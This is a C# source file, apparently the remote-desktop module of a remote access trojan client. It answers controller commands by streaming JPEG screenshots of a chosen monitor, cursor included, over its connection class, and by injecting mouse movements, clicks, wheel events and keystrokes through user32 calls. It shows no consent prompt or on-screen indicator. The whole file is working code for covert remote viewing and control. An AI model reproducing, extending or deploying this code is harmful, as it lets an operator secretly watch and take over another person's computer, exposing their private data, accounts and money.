using Stuff;
using System;
using System.Drawing.Drawing2D;
using System.Drawing.Imaging;
using System.Drawing;
using System.IO;
using Encoder = System.Drawing.Imaging.Encoder;
using Client.Connection;
using Client.Things;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.Threading;


namespace Client.Handlers
{
    internal class HandleRemoteDesktop
    {
        public static bool isDesktopCapturing { get; set; }
        public void Run(Unpack unpack)
        {
            switch (unpack.GetAsString("Command"))
            {
                case "Screens":
                    {
                        Pack pack = new Pack();
                        pack.Set("Packet", "RemoteDesktop");
                        pack.Set("UID", UID.Get());
                        pack.Set("Screens", Convert.ToInt32(Screen.AllScreens.Length));
                        SillyClient.Send(pack.Pacc());
                        break;
                    }
                case "Start":
                    {
                        if (isDesktopCapturing) return;
                        isDesktopCapturing = true;
                        Capture(unpack.GetAsInteger("Screen"), unpack.GetAsInteger("Quality"));
                        break;
                    }
                case "Stop":
                    {
                        isDesktopCapturing = false;
                        break;
                    }
                case "MouseClick":
                    {
                        mouse_event((Int32)unpack.GetAsInteger("Button"), 0, 0, 0, 0);
                        break;
                    }
                case "MouseMove":
                    {
                        Point position = new Point(unpack.GetAsInteger("X"), unpack.GetAsInteger("Y"));
                        Cursor.Position = position;
                        break;
                    }
                case "MouseWheel":
                    {
                        mouse_event(0x0800, 0, 0, (uint)unpack.GetAsInteger("Delta"), 0);
                        break;
                    }

                case "KeyboardClick":
                    {
                        keybd_event(Convert.ToByte(unpack.GetAsInteger("Key")), 0, unpack.GetAsBoolen("isKeyDown") ? (uint)0x0000 : (uint)0x0002, UIntPtr.Zero);
                        break;
                    }
            }
        }
        private static void Capture(int screen, int quality)
        {
            while (isDesktopCapturing)
            {
                try
                {
                    using (Bitmap bmp = GetScreen(screen))
                    {
                        using (MemoryStream imageStream = new MemoryStream())
                        {
                            var encoder = GetEncoder(ImageFormat.Jpeg);
                            var encParams = new EncoderParameters(1);
                            encParams.Param[0] = new EncoderParameter(Encoder.Quality, (long)quality);
                            bmp.Save(imageStream, encoder, encParams);

                            Pack pack = new Pack();
                            pack.Set("Packet", "RemoteDesktop");
                            pack.Set("UID", UID.Get());
                            pack.Set("Screens", Convert.ToInt32(Screen.AllScreens.Length));
                            pack.Set("ImageBytes", imageStream.ToArray());
                            SillyClient.Send(pack.Pacc());
                        }
                    }
                    Thread.Sleep(5);
                }
                catch
                {
                    isDesktopCapturing = false;
                    break;
                }
            }
        }
        private static ImageCodecInfo GetEncoder(ImageFormat format)
        {
            ImageCodecInfo[] codecs = ImageCodecInfo.GetImageDecoders();
            foreach (ImageCodecInfo codec in codecs)
            {
                if (codec.FormatID == format.Guid)
                {
                    return codec;
                }
            }
            return null;
        }
        private static Bitmap GetScreen(int Scrn)
        {
            Rectangle rect = Screen.AllScreens[Scrn].Bounds;
            try
            {
                Bitmap bmpScreenshot = new Bitmap(rect.Width, rect.Height);
                using (Graphics graphics = Graphics.FromImage(bmpScreenshot))
                {
                    graphics.CompositingQuality = CompositingQuality.HighSpeed;
                    graphics.CopyFromScreen(rect.Left, rect.Top, 0, 0, new Size(bmpScreenshot.Width, bmpScreenshot.Height), CopyPixelOperation.SourceCopy);
                    CURSORINFO pci;
                    pci.cbSize = System.Runtime.InteropServices.Marshal.SizeOf(typeof(CURSORINFO));
                    if (GetCursorInfo(out pci))
                    {
                        if (pci.flags == CURSOR_SHOWING)
                        {
                            DrawIcon(graphics.GetHdc(), pci.ptScreenPos.x, pci.ptScreenPos.y, pci.hCursor);
                            graphics.ReleaseHdc();
                        }
                    }
                    return bmpScreenshot;
                }
            }
            catch { return new Bitmap(rect.Width, rect.Height); }
        }
        #region Native Method's
        [DllImport("user32.dll")]
        static extern void mouse_event(int dwFlags, int dx, int dy, uint dwData, int dwExtraInfo);

        [DllImport("user32.dll")]
        internal static extern bool keybd_event(byte bVk, byte bScan, uint dwFlags, UIntPtr dwExtraInfo);

        [StructLayout(LayoutKind.Sequential)]
        struct CURSORINFO
        {
            public Int32 cbSize;
            public Int32 flags;
            public IntPtr hCursor;
            public POINTAPI ptScreenPos;
        }

        [StructLayout(LayoutKind.Sequential)]
        struct POINTAPI
        {
            public int x;
            public int y;
        }

        [DllImport("user32.dll")]
        static extern bool GetCursorInfo(out CURSORINFO pci);

        [DllImport("user32.dll")]
        static extern bool DrawIcon(IntPtr hDC, int X, int Y, IntPtr hIcon);
        const Int32 CURSOR_SHOWING = 0x00000001;
        #endregion
    }
}

